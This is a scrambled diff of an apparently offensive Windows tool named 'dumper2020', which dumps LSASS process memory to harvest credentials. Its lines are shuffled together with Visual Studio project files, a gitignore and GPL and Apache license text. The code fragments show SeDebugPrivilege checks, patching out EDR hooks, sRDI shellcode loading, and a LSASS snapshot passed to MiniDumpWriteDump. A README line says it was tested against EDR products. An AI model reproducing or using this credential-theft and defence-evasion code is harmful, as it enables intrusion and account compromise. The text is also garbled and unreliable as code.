@@ -1,0 +1,2295 @@
+    
+        
+                        
+                                        break
+                                        status = TRUE
+                                    // Apply updated privilege struct to token
+                                    break
+                                    status = TRUE
+                                    tokenPrivs->Privileges[i].Attributes 
+                                    {
+                                    }
+                                 Apache License
+                                else
+                                hasDebug = TRUE
+                                if (!(tokenPrivs->Privileges[i].Attributes 
+                                {
+                                }
+                            // Failed to patch function
+                            // Free snapshot
+                            // Initialize MiniDumpWriteDump callback struct
+                            // Perform the dump
+                            // SeDebugPrivilege LUID = 0x14
+                            // Successfully patched function
+                            MINIDUMP_CALLBACK_INFORMATION callbackInfo
+                            Preamble
+                            SecureZeroMemory(
+                            callbackInfo.CallbackParam = NULL
+                            callbackInfo.CallbackRoutine = ATPMiniDumpWriteDumpCallback
+                            else
+                            failure
+                            if (tokenPrivs->Privileges[i].Luid.LowPart == 0x14)
+                            success
+                            {
+                            }
+                        // Capture snapshot of LSASS
+                        // Delete hooked function struct
+                        // Initialize handle to LSASS snapshot
+                        // Loop through privileges assigned to token to find SeDebugPrivilege
+                        // Result of LSASS snapshot attempt
+                        // Track whether or not token has SeDebugPrivilege
+                        BOOL hasDebug = FALSE
+                        DWORD snapshotResult = 0
+                        HPSS snapshot = NULL
+                        break
+                        delete 
+                        else
+                        for (DWORD i = 0
+                        http://www.apache.org/licenses/
+                        if (!hasDebug)
+                        if (RestoreHookedFunction(
+                        pid = HandleToULong(processInfo->ProcessId)
+                        {
+                        }
+                       TERMS AND CONDITIONS
+                      GNU GENERAL PUBLIC LICENSE
+                     END OF TERMS AND CONDITIONS
+                    // Allocate memory to store current token privileges
+                    // Clean up array of now invalid pointers
+                    // Free token privileges buffer
+                    // Get current token privileges
+                    // Keep track of unhook attempts
+                    // Loop through hooked functions and attempt to patch them
+                    // Move pointer to next entry in the process table
+                    // Print stats
+                    PTOKEN_PRIVILEGES tokenPrivs = (PTOKEN_PRIVILEGES)new BYTE[tokenPrivsSize]
+                    delete tokenPrivs
+                    for (auto itr = module->HookedFunctions.begin()
+                    if (MiniDumpWriteDump)
+                    if (RtlEqualUnicodeString(
+                    if (failure > 0)
+                    if (success > 0)
+                    int failure = 0
+                    int success = 0
+                    module->HookedFunctions.clear()
+                    moduleCount = bytesRequired / sizeof(HMODULE)
+                    processInfo = (PSYSTEM_PROCESSES)(((LPBYTE)processInfo) 
+                    {
+                    }
+                // Assign current module handle to the struct
+                // Assign process info pointer to buffer
+                // Attempt to enumerate process modules again
+                // Check if any of the module's functions are hooked
+                // Close LSASS handle
+                // Delete module struct
+                // Get current module path and assign to the struct
+                // Get size of current privilege array
+                // Initialize handle to debug DLL loaded by sRDI
+                // Loop through processes until lsass.exe is found
+                // New module struct
+                // Perform sRDI and get handle to debug DLL
+                // Size of token privilege struct
+                // Success
+                DWORD tokenPrivsSize = 0
+                HMODULE debugDll = NULL
+                HookedFunction->Address = LmFunction
+                HookedFunction->ModuleHandle = pModule->Handle
+                HookedFunction->Ordinal = LmOrdinalTable[i]
+                NtClose(lsass)
+                PHOOKED_FUNCTION HookedFunction = new HOOKED_FUNCTION
+                PLOADED_MODULE module = new LOADED_MODULE
+                PSYSTEM_PROCESSES processInfo = (PSYSTEM_PROCESSES)processInfoBuffer
+                RtlInitUnicodeString(
+                UNICODE_STRING lsassString
+                bReturn = TRUE
+                continue
+                delete module
+                if ((debugDll = LoadDLL((LPSTR)GetDebugDLLPath().data())))
+                if (CheckModuleForHooks(module))
+                module->Handle = moduleHandles[i]
+                pModule->HookedFunctions.push_back(HookedFunction)
+                return TRUE
+                while (processInfo->NextEntryDelta)
+                {
+                }
+             SnapshotHandle
+            // Check if the address of the loaded export is executable. Skip if not.
+            // Check if the function is hooked by comparing memory between the loaded module and the fresh copy.
+            // Check if token is elevated
+            // Close process handle
+            // Free process info buffer
+            // Get handle to the local process
+            // Get process information
+            // Get the address of the export (loaded 
+            // Increase buffer to the required size
+            // Initialize LSASS handle
+            // Open LSASS
+            // Restore original page protection settings (i.e. RX)
+            DWORD funcRva = 
+            FARPROC FmFunction = (FARPROC)((DWORD_PTR)FmHandle 
+            FARPROC LmFunction = (FARPROC)((DWORD_PTR)LmHandle 
+            HANDLE lsass = NULL
+            HANDLE process = GetCurrentProcess()
+            How to Apply These Terms to Your New Programs
+            MEMORY_BASIC_INFORMATION mbi = { 0 }
+            NtClose(process)
+            break
+            else
+            for (DWORD i = 1
+            if ((lsass = GetHandle(lsassPid)))
+            if ((mbi.Protect 
+            if ((moduleHandles = (HMODULE
+            if (DeleteDumpFile(dumpPath))
+            if (tokenElevation.TokenIsElevated)
+            {
+            }
+          Derivative Works a copy of this License
+          as modifying the License.
+          as part of the Derivative Works
+          do not modify the License. You may add Your own attribution
+          excluding those notices that do not pertain to any part of
+          include a readable copy of the attribution notices contained
+          of the NOTICE file are for informational purposes only and
+          of the following places: within a NOTICE text file distributed
+          stating that You changed the files
+          that such additional attribution notices cannot be construed
+          the Derivative Works
+          wherever such third-party notices normally appear. The contents
+         // Handle to loaded DLL
+        // Allocate memory for process info
+        // Close file handle
+        // Close heap handle
+        // Close token handle
+        // Failed to delete file
+        // File deleted
+        // Free module handles buffer
+        // Get LSASS PID
+        // Get handle to heap
+        // Get the export table for the fresh module.
+        // Get the export table for the loaded module.
+        // Get token elevation status
+        // Initialize LSASS PID variable
+        // Initialize process info buffer
+        // Number of loaded modules
+        // Patch function in memory by overwriting with fresh bytes from disk
+        // Perform sRDI and get a handle to the loaded DLL
+        // Populate buffer with module handles
+        // Size of token elevation struct
+        // System info struct
+        // Token elevation struct
+        // Use dbgcore.dll with Windows 10
+        // Use dbghelp.dll for everything else
+        // Walk the export table.
+        CallbackOutput->Status = S_FALSE
+        DWORD lsassPid = 0
+        DWORD moduleCount = 0
+        DWORD tokenElevationSize = sizeof(TOKEN_ELEVATION)
+        HANDLE heap = GetProcessHeap()
+        LPDWORD FmFunctionTable = (LPDWORD)((DWORD_PTR)FmHandle 
+        LPDWORD FmNameTable = (LPDWORD)((DWORD_PTR)FmHandle 
+        LPDWORD LmFunctionTable = (LPDWORD)((DWORD_PTR)LmHandle 
+        LPDWORD LmNameTable = (LPDWORD)((DWORD_PTR)LmHandle 
+        LPVOID processInfoBuffer = NULL
+        LPWORD FmOrdinalTable = (LPWORD)((DWORD_PTR)FmHandle 
+        LPWORD LmOrdinalTable = (LPWORD)((DWORD_PTR)LmHandle 
+        NtClose(dump)
+        NtClose(heap)
+        NtClose(token)
+        PIMAGE_EXPORT_DIRECTORY FmExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)FmHandle 
+        PIMAGE_EXPORT_DIRECTORY LmExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)LmHandle 
+        RDI rdi = (RDI)(srdiBuffer)
+        TOKEN_ELEVATION tokenElevation = { 0 }
+        break
+        dll = (HMODULE)rdi()
+        fclose(fp)
+        for (DWORD i = 0
+        fread(
+        free(srdiBuffer)
+        if (!expNameStr)
+        if (!status)
+        if ((lsassPid = GetPid()))
+        if ((moduleCount = GetModules(moduleHandles)))
+        if (bytesRequired > sizeof(HMODULE) 
+        path 
+        return FALSE
+        return NULL
+        return TRUE
+        size = ftell(fp)
+        {
+        }
+       // Original memory page protection setting
+       // Size of the final sRDI blob
+       http://www.apache.org/licenses/LICENSE-2.0
+      (a) You must give any other recipients of the Work or
+      (an example is provided in the Appendix below).
+      (b) You must cause any modified files to carry prominent notices
+      </AdditionalDependencies>
+      </AdditionalLibraryDirectories>
+      </BufferSecurityCheck>
+      </EntryPointSymbol>
+      </ExportNamedFunctions>
+      </IgnoreAllDefaultLibraries>
+      </PrecompiledHeader>
+      </SDLCheck>
+      <AdditionalDependencies>
+      <AdditionalDependencies>advapi32.lib
+      <AdditionalDependencies>kernel32.lib
+      <AdditionalLibraryDirectories>
+      <AdditionalLibraryDirectories>$(SolutionDir)$(Platform)
+      <AdditionalLibraryDirectories>$(SolutionDir)lib
+      <BufferSecurityCheck>
+      <BufferSecurityCheck>true</BufferSecurityCheck>
+      <Configuration>Debug</Configuration>
+      <Configuration>Release</Configuration>
+      <ConformanceMode>true</ConformanceMode>
+      <DebugInformationFormat>None</DebugInformationFormat>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <EnableUAC>false</EnableUAC>
+      <EntryPointSymbol>
+      <ExceptionHandling>Sync</ExceptionHandling>
+      <ExportNamedFunctions>
+      <Extensions>cpp
+      <Extensions>h
+      <Extensions>rc
+      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
+      <FileType>Document</FileType>
+      <Filter>Header Files</Filter>
+      <Filter>Source Files</Filter>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <GenerateDebugInformation>DebugFull</GenerateDebugInformation>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <IgnoreAllDefaultLibraries>
+      <IgnoreAllDefaultLibraries>true</IgnoreAllDefaultLibraries>
+      <IntrinsicFunctions>false</IntrinsicFunctions>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <LinkTimeCodeGeneration>UseLinkTimeCodeGeneration</LinkTimeCodeGeneration>
+      <OmitFramePointers>false</OmitFramePointers>
+      <Optimization>Disabled</Optimization>
+      <Optimization>MaxSpeed</Optimization>
+      <Optimization>MinSpace</Optimization>
+      <OptimizeReferences>true</OptimizeReferences>
+      <Platform>Win32</Platform>
+      <Platform>x64</Platform>
+      <PrecompiledHeader>
+      <PrecompiledHeader>NotUsing</PrecompiledHeader>
+      <PrecompiledHeader>Use</PrecompiledHeader>
+      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
+      <PreprocessorDefinitions>NDEBUG
+      <PreprocessorDefinitions>POC
+      <PreprocessorDefinitions>WIN32
+      <PreprocessorDefinitions>_DEBUG
+      <PreprocessorDefinitions>_UNICODE
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <SDLCheck>
+      <SDLCheck>true</SDLCheck>
+      <SubSystem>Console</SubSystem>
+      <SubSystem>Windows</SubSystem>
+      <UACExecutionLevel>AsInvoker</UACExecutionLevel>
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <WarningLevel>Level3</WarningLevel>
+      Contribution(s) alone or by combination of their Contribution(s)
+      PARTICULAR PURPOSE. You are solely responsible for determining the
+      Work and such Derivative Works in Source or Object form.
+      You may add Your own copyright statement to Your modifications and
+      and conversions to other media types.
+      and distribution as defined by Sections 1 through 9 of this document.
+      any Contribution intentionally submitted for inclusion in the Work
+      appropriateness of using or redistributing the Work and assume any
+      as of the date such litigation is filed.
+      by You to the Licensor shall be under the terms and conditions of
+      by such Contributor that are necessarily infringed by their
+      comment syntax for the file format. We also recommend that a
+      copyright notice that is included in or attached to the work
+      cross-claim or counterclaim in a lawsuit) alleging that the Work
+      except as required for reasonable and customary use in describing the
+      excluding communication that is conspicuously marked or otherwise
+      exercising permissions granted by this License.
+      file or class name and description of purpose be included on the
+      granted to You under this License for that Work shall terminate
+      has been advised of the possibility of such damages.
+      identification within third-party archives.
+      institute patent litigation against any entity (including a
+      may provide additional or different license terms and conditions
+      meet the following conditions:
+      of your accepting any such warranty or additional liability.
+      on behalf of whom a Contribution has been received by Licensor and
+      or a Contribution incorporated within the Work constitutes direct
+      or by an individual or Legal Entity authorized to submit on behalf of
+      or other liability obligations and/or rights consistent with this
+      origin of the Work and reproducing the content of the NOTICE file.
+      replaced with your own identifying information. (Don't include
+      result of this License or out of the use or inability to use the
+      risks associated with Your exercise of permissions under this License.
+      submitted to Licensor for inclusion in the Work by the copyright owner
+      subsequently incorporated within the Work.
+      the Work and Derivative Works thereof.
+      the brackets!)  The text should be enclosed in the appropriate
+      the conditions stated in this License.
+      the copyright owner that is granting the License.
+      the original version of the Work and any modifications or additions
+      the terms of any separate license agreement you may have executed
+      unless required by applicable law (such as deliberate and grossly
+      where such license applies only to those patent claims licensable
+      with Licensor regarding such Contributions.
+      with the Work to which such Contribution(s) was submitted. If You
+    (at your option) any later version.
+    )
+    // 64-bit only
+    // Allocate buffer for array of module handles
+    // Append appropriate DLL name
+    // Bootstrap shellcode
+    // Buffer that will hold the final sRDI blob
+    // Check if the export table exists.
+    // Check requirements before anything else
+    // Close heap handle
+    // Close process and heap handle
+    // Convert DLL to shellcode
+    // Convert path wide string to unicode string
+    // Create destination file
+    // Create dump file
+    // DLL bytes
+    // Delete dump file
+    // Dynamically resolve RTL/PSS functions
+    // Ends up looking like this in memory:
+    // Enumerate process modules
+    // File handle and structs
+    // File object attributes
+    // Free sRDI blob
+    // Get DLL bytes from disk
+    // Get function pointers
+    // Get handle to local process
+    // Get handle to process heap
+    // Get handle to the heap
+    // Get size of the process table
+    // Initialize client ID and object attributes
+    // Initialize handle to dump file
+    // Initialize handle to process token
+    // Initialize pointer to buffer containing array of module handles
+    // Initialize process handle
+    // Initialize return variable containing number of loaded modules
+    // Initialize sRDI bootstrap
+    // Initialize string with system directory
+    // Initialize variable for bytes required to store module handles
+    // LSASS PID
+    // Load a fresh copy in memory.
+    // Modify memory page containing the hooked function so we can patch it
+    // Module handles
+    // Open our token
+    // Open the process
+    // Overall status of requirement checks
+    // Page size and pointer for NtProtectVirtualMemory
+    // Parse the fresh module's PE headers.
+    // Parse the original module's PE headers.
+    // Patch hooks as needed
+    // Path to dump file in NT format
+    // RDI shellcode
+    // Return handle
+    // Return handle (or NULL on failure)
+    // Return the handle or NULL on failure
+    // Sanity check to verify we have a PE
+    // Set first page to RX to cover the sRDI boostrap at the top of the blob
+    // Set the offset to our DLL from pop result
+    // Setup the location of our user data
+    // Status of the dump procedure
+    // Unmap fresh module.
+    // User data
+    // call - Transfer execution to the RDI
+    // call next instruction (Pushes next instruction address to stack)
+    // mov dword ptr [rsp 
+    // pop rcx - Capture our current location in memory
+    // pop rsi - Put things back where we left them
+    // push rsi - save original value
+    // ret - return to caller
+    7.  This requirement modifies the requirement in section 4 to
+    </ClCompile>
+    </ClInclude>
+    </Filter>
+    </Lib>
+    </Link>
+    </MASM>
+    </ProjectConfiguration>
+    <CharacterSet>Unicode</CharacterSet>
+    <ClCompile>
+    <ConfigurationType>Application</ConfigurationType>
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <ConfigurationType>StaticLibrary</ConfigurationType>
+    <GenerateManifest>false</GenerateManifest>
+    <Keyword>Win32Proj</Keyword>
+    <Lib>
+    <Link>
+    <LinkIncremental>false</LinkIncremental>
+    <LinkIncremental>true</LinkIncremental>
+    <OutDir>$(SolutionDir)bin
+    <OutDir>$(SolutionDir)lib
+    <PlatformToolset>v142</PlatformToolset>
+    <ProjectGuid>{84A7E50E-B0F0-4B3D-98CD-F32CDB1EB8CA}</ProjectGuid>
+    <ProjectGuid>{B7355478-EEE0-46A7-807A-23CF0C5295AE}</ProjectGuid>
+    <ProjectGuid>{D8091ED0-5E78-4AF5-93EE-A5AA6E978430}</ProjectGuid>
+    <RootNamespace>dumper2020</RootNamespace>
+    <RootNamespace>dumper2020dll</RootNamespace>
+    <RootNamespace>dumper2020exe</RootNamespace>
+    <TargetName>$(ProjectName)</TargetName>
+    <TargetName>$(SolutionName)</TargetName>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <UseOfMfc>false</UseOfMfc>
+    <VCProjectVersion>15.0</VCProjectVersion>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+    Appropriate Legal Notices
+    BOOL bReturn = FALSE
+    BOOL status = FALSE
+    BOOLEAN CaseInSensitive
+    BYTE bootstrap[64] = { 0 }
+    CHAR systemDir[MAX_PATH]
+    CloseHandle(FmFileHandle)
+    CloseHandle(FmMappingHandle)
+    Copyright (C) {year}  {name of author}
+    Corresponding Source along with the object code.  If the place to
+    Corresponding Source fixed on a durable physical medium
+    Corresponding Source from a network server at no charge.
+    Corresponding Source in the same way through the same place at no
+    Corresponding Source.  Regardless of what server hosts the
+    DWORD   Ordinal        = 0
+    DWORD bufferSize = 0
+    DWORD bytesRequired = 0
+    DWORD dllOffset
+    DWORD dllSize = 0
+    DWORD dwProtection = 0
+    DWORD i = 0
+    DWORD moduleCount = 0
+    DWORD oldProtect = 0
+    DWORD pid = 0
+    DWORD rdiShellcodeLength = 1997
+    DWORD userDataLocation
+    FILE 
+    GNU General Public License for more details.
+    GetNativeSystemInfo(
+    HANDLE InheritedFromProcessId
+    HANDLE ProcessId
+    HANDLE dump = NULL
+    HANDLE file = NULL
+    HANDLE hProc = GetCurrentProcess()
+    HANDLE handle = NULL
+    HANDLE heap = GetProcessHeap()
+    HANDLE process = GetCurrentProcess()
+    HANDLE token = NULL
+    HMODULE
+    HMODULE Handle = 0
+    HMODULE LmHandle = pModule->Handle
+    HMODULE ModuleHandle   = 0
+    HMODULE dll = NULL
+    HPSS
+    HPSS   SnapshotHandle
+    IO_STATUS_BLOCK ioStatusBlock
+    InitializeObjectAttributes(
+    KPRIORITY BasePriority
+    LARGE_INTEGER CreateTime
+    LARGE_INTEGER KernelTime
+    LARGE_INTEGER UserTime
+    LPCSTR expNameStr
+    LPSTR dllBytes = NULL
+    LPSTR srdiBuffer = NULL
+    LPVOID  Address        = nullptr
+    License to anyone who comes into possession of a copy.  This
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    MoveMemory(bootstrap 
+    MoveMemory(outBytes 
+    Notices displayed by works containing it
+    NtClose(heap)
+    NtClose(process)
+    NtCreateFile(
+    NtOpenProcess(
+    OBJECT_ATTRIBUTES fileObjectAttributes
+    PCWSTR SourceString
+    PIMAGE_DATA_DIRECTORY dataDir = 
+    PIMAGE_DOS_HEADER FmDosHeader = (PIMAGE_DOS_HEADER)FmHandle
+    PIMAGE_DOS_HEADER LmDosHeader = (PIMAGE_DOS_HEADER)LmHandle
+    PIMAGE_NT_HEADERS FmNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)FmHandle 
+    PIMAGE_NT_HEADERS LmNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)LmHandle 
+    PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
+    PSS_CREATE_RELEASE_SECTION = 0x80000000
+    PVOID pBuffer = srdiBuffer
+    PVOID pPage = pHookedFunction->Address
+    PatchHooks()
+    RtlInitUnicodeString(
+    SIZE_T cbWritten = 0
+    SIZE_T pageSize = PATCH_SIZE
+    SIZE_T pageSize = sysInfo.dwPageSize
+    SYSTEM_INFO sysInfo
+    SecureZeroMemory(
+    Source of the work are being offered to the general public at no
+    The names of its contributors may not be used to endorse or promote products derived from this software without specific prior written permission.
+    This program comes with ABSOLUTELY NO WARRANTY
+    This program is free software: you can redistribute it and/or modify
+    UCHAR   FreshBytes[16] = { 0 }
+    ULONG NextEntryDelta
+    ULONG Reserved1[6]
+    ULONG ThreadCount
+    ULONG processInfoSize = 0
+    UNICODE_STRING ProcessName
+    UNICODE_STRING pathString
+    UnmapViewOfFile(FmHandle)
+    WCHAR   Name[MAX_PATH] = { 0 }
+    WCHAR Path[MAX_PATH] = { 0 }
+    You should have received a copy of the GNU General Public License
+    __inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
+    a) Disclaiming warranty or limiting liability differently from the
+    a) The work must carry prominent notices stating that you modified
+    any liability that these contractual assumptions directly impose on
+    author attributions in that material or in the Appropriate Legal
+    authors of the material
+    available for as long as needed to satisfy these requirements.
+    b) Requiring preservation of specified reasonable legal notices or
+    b) The work must carry prominent notices stating that it is
+    bootstrap[i
+    but WITHOUT ANY WARRANTY
+    c) Convey individual copies of the object code with a copy of the
+    case 16: // IsProcessSnapshotCallback
+    charge under subsection 6d.
+    clear directions next to the object code saying where to find the
+    copy of the Corresponding Source for all the software in the
+    customarily used for software interchange.
+    d) Convey the object code by offering access from a designated
+    d) Limiting the use for publicity purposes of names of licensors or
+    dllOffset = sizeof(bootstrap) - i 
+    e) Declining to grant rights under trademark law for use of some
+    else
+    else moduleCount = bytesRequired / sizeof(HMODULE)
+    errno_t err = fopen_s(
+    f) Requiring indemnification of licensors and authors of that
+    for (DWORD i = 0
+    further charge.  You need not require recipients to copy the
+    i 
+    if (!Requirements())
+    if (!ResolveFunctions())
+    if (!RtlInitUnicodeString 
+    if (!dataDir->Size)
+    if (!exportDir->NumberOfNames 
+    if ((dump = CreateDumpFile(dumpPath)))
+    if ((moduleHandles = (HMODULE
+    if (GetWinVersion() == 10)
+    if (LmNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress != 0) {
+    if (NtDeleteFile(
+    if (dllBytes[0] != 'M' 
+    if (fp)
+    if (hModule == NULL 
+    if (sizeof(LPVOID) != 8)
+    if (srdiBuffer)
+    invalidate such permission if you have separately received it.
+    it under the terms of the GNU General Public License as published by
+    long as you offer spare parts or customer support for that product
+    material by anyone who conveys the material (or modified versions of
+    may be on a different server (operated by you or a third party)
+    more than your reasonable cost of physically performing this
+    ntPath 
+    outBytes = (LPSTR)malloc(outSize)
+    outSize = dllSize 
+    path 
+    reasonable ways as different from the original version
+    regardless of how they are packaged.  This License gives no
+    released under this License and any conditions added under section
+    requiring that modified versions of such material be marked in
+    return 
+    return FALSE
+    return NULL
+    return TRUE
+    return bReturn
+    return dll
+    return file
+    return handle
+    return moduleCount
+    return path
+    return pid
+    return status
+    std::vector<PHOOKED_FUNCTION> HookedFunctions
+    switch (CallbackInput->CallbackType)
+    terms of sections 15 and 16 of this License
+    those licensors and authors.
+    under certain conditions
+    userDataLocation = dllOffset 
+    with subsection 6b.
+    work need not make them do so.
+    written offer to provide the Corresponding Source.  This
+    you inform other peers where the object code and Corresponding
+    {
+    {one line to give the program's name and a brief idea of what it does.}
+    {project}  Copyright (C) {year}  {fullname}
+    }
+   1. Definitions.
+   2. Grant of Copyright License. Subject to the terms and conditions of
+   3. Grant of Patent License. Subject to the terms and conditions of
+   4. Redistribution. You may reproduce and distribute copies of the
+   6. Trademarks. This License does not grant permission to use the trade
+   7. Disclaimer of Warranty. Unless required by applicable law or
+   9. Accepting Warranty or Additional Liability. While redistributing
+   APPENDIX: How to apply the Apache License to your work.
+   Copyright [yyyy] [name of copyright owner]
+   END OF TERMS AND CONDITIONS
+   See the License for the specific language governing permissions and
+   You may obtain a copy of the License at
+   limitations under the License.
+   you may not use this file except in compliance with the License.
+  0. Definitions.
+  1. Source Code.
+  10. Automatic Licensing of Downstream Recipients.
+  11. Patents.
+  12. No Surrender of Others' Freedom.
+  13. Use with the GNU Affero General Public License.
+  14. Revised Versions of this License.
+  15. Disclaimer of Warranty.
+  16. Limitation of Liability.
+  17. Interpretation of Sections 15 and 16.
+  2. Basic Permissions.
+  3. Protecting Users' Legal Rights From Anti-Circumvention Law.
+  4. Conveying Verbatim Copies.
+  5. Conveying Modified Source Versions.
+  6. Conveying Non-Source Forms.
+  7. Additional Terms.
+  8. Termination.
+  9. Acceptance Not Required for Having Copies.
+  </ImportGroup>
+  </ItemDefinitionGroup>
+  </ItemGroup>
+  </PropertyGroup>
+  <ItemGroup>
+  A compilation of a covered work with other separate and independent
+  All rights granted under this License are granted for the term of
+  Conveying under any other circumstances is permitted solely under
+  Developers that use the GNU GPL protect your rights with two steps:
+  Each version is given a distinguishing version number.  If the
+  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
+  If the Program specifies that a proxy can decide which future
+  If the disclaimer of warranty and limitation of liability provided
+  Later license versions may give you additional or different
+  No covered work shall be deemed part of an effective technological
+  Nothing in this License shall be construed as excluding or limiting
+  Some devices are designed to deny users access to install or run
+  Termination of your rights under this section does not terminate the
+  The Corresponding Source for a work in source code form is that
+  The Corresponding Source need not include anything that users
+  The Free Software Foundation may publish revised and/or new versions of
+  The GNU General Public License does not permit incorporating your program
+  The licenses for most software and other practical works are designed
+  The requirement to provide Installation Information does not include a
+  You are not required to accept this License in order to receive or
+  You may convey a covered work in object code form under the terms
+  You may convey verbatim copies of the Program's source code as you
+  You may not impose any further restrictions on the exercise of the
+  You may not propagate or modify a covered work except as expressly
+ !PssCaptureSnapshot 
+ !PssFreeSnapshot)
+ !RtlEqualUnicodeString 
+ !exportDir->NumberOfFunctions)
+ !tools/packages.config
+ (https://github.com/github/gitignore/pull/1529
+ (https://github.com/github/gitignore/pull/2483
+ - Incorporated the Defender ATP 
+ - Syscall macros were generated with [SysWhispers](https://github.com/jthuraisamy/SysWhispers) and code from [TelemetrySourcerer](https://github.com/jthuraisamy/TelemetrySourcerer) was adapted for API hook detection/removal.
+ - [sRDI](https://github.com/monoxgas/sRDI) was integrated to dynamically load the system DLL that exports the 
+ .NET Core
+ // 32 bytes for shadow space 
+ // Append slash
+ // Skip over the remainder of instructions
+ 1024)
+ 1024)))
+ 4))
+ 64-bit only
+ 8 bytes for last arg 
+ 8 bytes for stack alignment
+ <Length of DLL>
+ ASP.NET Scaffolding
+ Auto detect text files and perform LF normalization
+ AxoCover is a Code Coverage Tool
+ Azure Stream Analytics local run output
+ Background
+ Backup 
+ Backup folder for Package Reference Convert tool in Visual Studio 2017
+ BeatPulse healthcheck temp database
+ Benchmark Results
+ BizTalk build output
+ Build Results of an ATL Project
+ Build results
+ Business Intelligence projects
+ Cake - Uncomment if you are using it
+ Chutzpah Test files
+ Click-Once directory
+ CodeRush personal settings
+ Compiled Dynamic libraries
+ Compiled Object files
+ Compiled Static libraries
+ Considerations
+ Credit/Thanks
+ DocProject is a documentation generator add-in
+ DotCover is a Code Coverage Tool
+ Dump file creation
+ Everyone is permitted to copy and distribute verbatim copies
+ Executables
+ FAKE - F
+ Files built by Visual Studio
+ Files/
+ FmDosHeader->e_lfanew)
+ FmExportDirectory->AddressOfFunctions)
+ FmExportDirectory->AddressOfNameOrdinals)
+ FmExportDirectory->AddressOfNames)
+ FmFunctionTable[FmOrdinalTable[i]])
+ FmNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
+ Fody - auto-generated XML schema
+ Fortran module files
+ Get latest from https://github.com/github/gitignore/blob/master/VisualStudio.gitignore
+ GhostDoc plugin setting file
+ Guidance Automation Toolkit
+ Including strong name files can present a security risk
+ Installshield output folder
+ Ionide (cross platform F
+ LSASS handle creation
+ Lightly tested on Windows 2012 R2 and Windows 10 with some common EDR solutions
+ LmDosHeader->e_lfanew)
+ LmExportDirectory->AddressOfFunctions)
+ LmExportDirectory->AddressOfNameOrdinals)
+ LmExportDirectory->AddressOfNames)
+ LmFunctionTable[LmOrdinalTable[i]])
+ LmNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
+ Local History for Visual Studio
+ MAJOR_VERSION_OFFSET)
+ MFractors (Xamarin productivity tool) working folder
+ MSBuild Binary and Structured Log
+ MSTest test Results
+ Make
+ Microsoft Azure Build Output
+ Microsoft Azure Emulator
+ Microsoft Azure Web App publish settings. Comment the next line if you want to
+ Microsoft Fakes
+ MightyMoose
+ Mono auto generated files
+ NCrunch
+ NUnit
+ NVidia Nsight GPU debugger configuration file
+ Neither the name of Harmony Security nor the names of its contributors may be used to
+ Node.js Tools for Visual Studio
+ NuGet Packages
+ NuGet Symbol Packages
+ NuGet v3's project.json files produces more ignorable files
+ OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
+ OpenCover UI analysis results
+ Others
+ Output directories
+ PAGE_EXECUTE_READ) == 0)
+ PCUNICODE_STRING
+ PROCESS_CREATE_THREAD 
+ PROCESS_DUP_HANDLE 
+ PSS_CAPTURE_HANDLES
+ PSS_CAPTURE_HANDLE_BASIC_INFORMATION
+ PSS_CAPTURE_HANDLE_NAME_INFORMATION
+ PSS_CAPTURE_HANDLE_TRACE
+ PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
+ PSS_CAPTURE_THREADS
+ PSS_CAPTURE_THREAD_CONTEXT
+ PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
+ PSS_CREATE_BREAKAWAY
+ PSS_CREATE_BREAKAWAY_OPTIONAL
+ PSS_CREATE_RELEASE_SECTION
+ PSS_CREATE_USE_VM_ALLOCATIONS
+ PSYSTEM_PROCESSES
+ Paket dependency manager
+ Precompiled Headers
+ Prerequisites
+ Publish Web Output
+ Python Tools for Visual Studio (PTVS)
+ RDI)()
+ RIA/Silverlight projects
+ ReSharper is a .NET coding add-in
+ SE_PRIVILEGE_ENABLED))
+ SQL Server files
+ Screenshot
+ StyleCop
+ Summary
+ SysWhispers
+ TFS 2012 Local Workspace
+ Tabs Studio
+ TeamCity is a build add-in
+ Telerik's JustMock configuration file
+ The packages folder can be ignored because of Package Restore
+ Uncomment if necessary however generally it will be regenerated when needed
+ Uncomment if you have tasks that create the project's static files in wwwroot
+ Usage
+ User-specific files
+ User-specific files (MonoDevelop/Xamarin Studio)
+ VS Code tools) working folder
+ Visual C
+ Visual Studio 2015/2017 cache/options directory
+ Visual Studio 2017 auto generated files
+ Visual Studio 2019 (v142)
+ Visual Studio 6 auto-generated workspace file (contains which files were open etc.)
+ Visual Studio 6 build log
+ Visual Studio 6 workspace options file
+ Visual Studio LightSwitch build output
+ Visual Studio Trace Files
+ Visual Studio Version 16
+ Visual Studio cache files
+ Visual Studio code coverage results
+ Visual Studio profiler
+ Web workbench (sass)
+ Windows Store app package directories and files
+ and
+ and each file should have at least
+ and give all
